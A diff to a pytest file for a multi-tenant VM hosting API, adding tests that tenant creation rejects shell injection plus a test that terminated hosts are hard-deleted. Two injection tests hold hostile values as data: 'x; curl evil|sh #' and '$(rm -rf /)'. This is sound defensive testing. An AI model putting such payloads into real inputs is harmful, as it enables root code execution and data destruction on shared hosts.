@@ -5,11 +5,12 @@
 Covers: scheduling (_find_host), overcommit, tenant CRUD, host ops, routing.
 """
 
-import json
-import pytest
 import importlib.util
+import json
 import sys
-from unittest.mock import patch, MagicMock
+from unittest.mock import MagicMock, patch
+
+import pytest
 from conftest import make_ddb_table
 
 # ── Import handler with mocked AWS SDK ──
@@ -189,6 +190,42 @@ class TestCreateTenant:
     def test_missing_body_returns_400(self):
         resp = api.create_tenant(None)
         assert resp["statusCode"] == 400
+
+    # ── SECURITY: config_template / skills flow into the root SSM launch
+    # command (launch-vm.sh args 5 & 7). Shell metacharacters must be rejected
+    # at create time, or they are arbitrary root RCE on a shared host.
+    @pytest.mark.unit
+    @pytest.mark.regression
+    def test_config_template_injection_rejected(self):
+        api.tenants_table = make_ddb_table()
+        api.hosts_table = make_ddb_table()
+        resp = api.create_tenant(json.dumps({
+            "name": "evil", "config_template": "x; curl evil|sh #"}))
+        assert resp["statusCode"] == 400
+        assert "config_template" in json.loads(resp["body"])["error"]
+
+    @pytest.mark.unit
+    def test_config_template_valid_name_accepted(self):
+        # A well-formed template name must NOT be rejected by the guard
+        # (it fails later on no-host → pending, which is fine — not a 400).
+        api.tenants_table = make_ddb_table()
+        api.hosts_table = make_ddb_table()
+        api.hosts_table.scan.return_value = {"Items": []}
+        _mock_asg.describe_auto_scaling_groups.return_value = {
+            "AutoScalingGroups": [{"DesiredCapacity": 1, "MaxSize": 5}]}
+        resp = api.create_tenant(json.dumps({
+            "name": "ok", "config_template": "bedrock-claude"}))
+        assert resp["statusCode"] == 201
+
+    @pytest.mark.unit
+    @pytest.mark.regression
+    def test_skill_name_injection_rejected(self):
+        api.tenants_table = make_ddb_table()
+        api.hosts_table = make_ddb_table()
+        resp = api.create_tenant(json.dumps({
+            "name": "evil2", "skills": ["ok-skill", "$(rm -rf /)"]}))
+        assert resp["statusCode"] == 400
+        assert "skill" in json.loads(resp["body"])["error"].lower()
 
 
 class TestCreateTenantRestore:
@@ -412,6 +449,29 @@ class TestRouting:
             "detail": {},
         }, None)
         assert resp["statusCode"] == 200
+
+
+class TestHostCleanupHardDelete:
+    """cleanup_terminated_host must HARD-delete the host row, not soft-mark it
+    status=deleted — soft rows accumulated (161 zombies observed live) and
+    inflated every scan / faked AZ outages."""
+
+    @pytest.mark.unit
+    @pytest.mark.regression
+    def test_host_row_is_deleted_not_soft_marked(self):
+        api.tenants_table = make_ddb_table()
+        api.tenants_table.scan.return_value = {"Items": []}  # no tenants on host
+        api.hosts_table = make_ddb_table()
+        with patch.object(api, "_remove_host_tg"), \
+             patch.object(api, "asg_client"):
+            api.cleanup_terminated_host({"detail": {
+                "EC2InstanceId": "i-dead",
+                "LifecycleHookName": "hook", "AutoScalingGroupName": "asg"}})
+        api.hosts_table.delete_item.assert_called_once_with(Key={"instance_id": "i-dead"})
+        # And it must NOT leave a soft status=deleted update on the host row.
+        for c in api.hosts_table.update_item.call_args_list:
+            vals = c.kwargs.get("ExpressionAttributeValues", {})
+            assert vals.get(":s") != "deleted", "host was soft-marked instead of deleted"
 
 
 # ═══════════════════════════════════════════
